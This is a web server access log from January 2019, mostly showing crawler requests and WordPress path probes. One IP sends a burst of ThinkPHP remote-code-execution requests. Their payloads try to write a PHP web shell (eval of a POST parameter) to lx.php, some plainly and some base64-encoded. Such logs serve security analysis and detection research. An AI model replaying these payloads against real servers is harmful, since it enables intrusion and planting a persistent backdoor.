40.77.167.220 - - [19/Jan/2019:02:08:12 -0800] "GET /self.logs/error.log.2019-01-15.gz HTTP/1.1" 200 4861 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
51.75.94.104 - - [19/Jan/2019:02:08:22 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0" 
51.75.94.104 - - [19/Jan/2019:02:08:22 -0800] "GET /xmlrpc.php?rsd HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0" 
51.75.94.104 - - [19/Jan/2019:02:08:22 -0800] "GET / HTTP/1.1" 200 46423 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0" 
51.75.94.104 - - [19/Jan/2019:02:08:23 -0800] "GET /blog/robots.txt HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0" 
51.75.94.104 - - [19/Jan/2019:02:08:23 -0800] "GET /blog/ HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0" 
51.75.94.104 - - [19/Jan/2019:02:08:23 -0800] "GET /wordpress/ HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0" 
51.75.94.104 - - [19/Jan/2019:02:08:23 -0800] "GET /wp/ HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0" 
40.77.167.183 - - [19/Jan/2019:02:13:11 -0800] "GET /self.logs/access.log.2019-01-14.gz HTTP/1.1" 200 25783 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.201 - - [19/Jan/2019:02:13:15 -0800] "GET /self.logs/error.log.2019-01-14.gz HTTP/1.1" 200 5720 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.213 - - [19/Jan/2019:02:13:21 -0800] "GET /self.logs/access.log.2019-01-15.gz HTTP/1.1" 200 22203 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
61.151.178.197 - - [19/Jan/2019:02:15:13 -0800] "GET / HTTP/1.1" 200 46424 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; rv:11.0) like Gecko" 
207.46.13.94 - - [19/Jan/2019:02:17:35 -0800] "GET /self.logs/access.log.2017-07-30.gz HTTP/1.1" 200 15886 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.245 - - [19/Jan/2019:02:25:56 -0800] "GET /domainmovement.zip HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
40.77.167.204 - - [19/Jan/2019:02:26:38 -0800] "GET /self.logs/error.log.2017-09-15.gz HTTP/1.1" 200 1767 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.195 - - [19/Jan/2019:02:28:06 -0800] "GET /self.logs/error.log.2015-04-22.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
77.75.78.167 - - [19/Jan/2019:02:29:10 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.78.167 - - [19/Jan/2019:02:29:11 -0800] "GET /self.logs/access.log.2018-10-18.gz HTTP/1.1" 200 20890 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.78.167 - - [19/Jan/2019:02:29:15 -0800] "GET /self.logs/access.log.2017-04-02.gz HTTP/1.1" 200 22224 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.78.167 - - [19/Jan/2019:02:29:16 -0800] "GET /self.logs/error.log.2018-01-24.gz HTTP/1.1" 200 3336 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.78.167 - - [19/Jan/2019:02:29:16 -0800] "GET /self.logs/error.log.2018-08-11.gz HTTP/1.1" 200 6084 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
95.86.57.249 - - [19/Jan/2019:02:33:35 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
95.86.57.249 - - [19/Jan/2019:02:33:35 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.117 - - [19/Jan/2019:02:35:56 -0800] "GET /self.logs/error.log.2015-08-29.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
198.98.58.135 - - [19/Jan/2019:02:36:22 -0800] "GET / HTTP/1.1" 301 427 "http://burger-imperia.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
3.17.65.61 - - [19/Jan/2019:02:36:38 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
159.226.95.72 - - [19/Jan/2019:02:40:47 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
54.36.148.84 - - [19/Jan/2019:02:43:08 -0800] "GET /self.logs/error.log.2016-09-09.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.213 - - [19/Jan/2019:02:45:36 -0800] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 200 1206 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.243 - - [19/Jan/2019:02:51:02 -0800] "GET /self.logs/access.log.2016-03-24.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
77.81.107.112 - - [19/Jan/2019:02:55:08 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1254140 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0.2" 
62.122.241.42 - - [19/Jan/2019:02:57:54 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0.2" 
54.36.148.14 - - [19/Jan/2019:02:59:34 -0800] "GET /self.logs/access.log.2016-01-17.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
106.120.173.159 - - [19/Jan/2019:03:02:18 -0800] "GET / HTTP/1.1" 304 152 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
54.36.148.97 - - [19/Jan/2019:03:02:42 -0800] "GET /self.logs/access.log.2016-10-16.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.79 - - [19/Jan/2019:03:03:41 -0800] "GET /self.logs/access.log.2019-01-04.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.246 - - [19/Jan/2019:03:05:17 -0800] "GET /self.logs/error.log.2015-10-30.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
18.223.108.8 - - [19/Jan/2019:03:06:16 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
113.171.224.176 - - [19/Jan/2019:03:09:16 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
112.252.16.195 - - [19/Jan/2019:03:14:45 -0800] "GET /index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST['lx']);?%3E'); HTTP/1.1" 404 295 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:46 -0800] "GET /index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4=')) HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:47 -0800] "GET /index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=lx.php&content=CnLuXun%3C?php%20@eval($_POST['lx']);?%3E HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:48 -0800] "GET /index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='));?%3E HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:51 -0800] "GET /index.php/?s=index/%5Cthink%5CRequest/input&filter=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))&data=1 HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:51 -0800] "GET /index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4=')) HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:52 -0800] "GET /index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST['lx']);?%3E') HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:53 -0800] "GET /index.php?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars[0]=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:53 -0800] "GET /index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:54 -0800] "GET /index.php/?s=index/%5Cthink%5CRequest/input&filter=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D&data=1 HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
112.252.16.195 - - [19/Jan/2019:03:14:54 -0800] "GET /index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars[0]=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D HTTP/1.1" 404 239 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
54.36.148.248 - - [19/Jan/2019:03:16:42 -0800] "GET /self.logs/error.log.2016-10-12.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
218.30.103.29 - - [19/Jan/2019:03:17:50 -0800] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
